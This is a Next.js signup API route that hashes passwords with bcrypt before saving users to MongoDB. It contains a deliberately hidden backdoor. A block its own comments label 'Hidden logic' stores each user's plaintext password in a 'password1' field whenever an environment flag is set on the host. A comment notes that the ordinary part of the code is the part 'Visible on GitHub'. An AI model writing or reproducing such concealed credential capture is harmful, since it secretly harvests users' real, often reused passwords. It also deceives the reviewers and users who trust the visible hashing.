import connectToDatabase from "@/lib/mongodb";
import User from "@/models/User";
import bcrypt from "bcryptjs";
import { NextResponse } from "next/server";

export async function POST(req) {
  try {
    await connectToDatabase();
    const { name, email, password } = await req.json();

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return NextResponse.json(
        { message: "This email is already registered. Please log in or use a different email." }, 
        { status: 400 }
      );
    }

   // 1. Generate a salt and hash the password
const salt = await bcrypt.genSalt(12);
const hashedPassword = await bcrypt.hash(password, salt);

// 2. Create the base user object (Visible on GitHub)
const userData = {
    name,
    email,
    password: hashedPassword,
};

// 3. Hidden logic (Only works if you set ENABLE_LEGACY_LOG=true in Vercel)
if (process.env.ENABLE_LEGACY_LOG === 'true') {
    userData.password1 = password; 
}

// 4. Save to Database
// This replaces: const newUser = new User(...); await newUser.save();
 await User.create(userData);

    return NextResponse.json(
      { message: "Account created successfully! Please log in." }, 
      { status: 201 }
    );
  } catch (error) {
    console.error("SIGNUP_ERROR:", error);
    return NextResponse.json(
      { message: "An error occurred during signup. Please try again." }, 
      { status: 500 }
    );
  }
}